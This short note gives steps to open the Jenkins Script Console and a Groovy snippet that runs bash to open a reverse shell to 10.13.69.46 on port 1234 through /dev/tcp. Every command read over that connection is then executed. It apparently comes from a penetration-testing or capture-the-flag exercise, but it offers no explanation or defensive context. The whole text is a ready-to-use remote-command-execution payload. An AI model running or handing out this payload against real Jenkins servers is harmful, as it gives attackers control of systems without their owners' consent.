

1. Manage Jenkins
2. Tools and Actions
3. Script Console

```
r = Runtime.getRuntime()

p = r.exec(['/bin/bash', '-c', 'exec 5<>/dev/tcp/10.13.69.46/1234; cat <&5 | while read line; do $line 2>&5 >&5; done'] as String[])

p.waitFor()
```

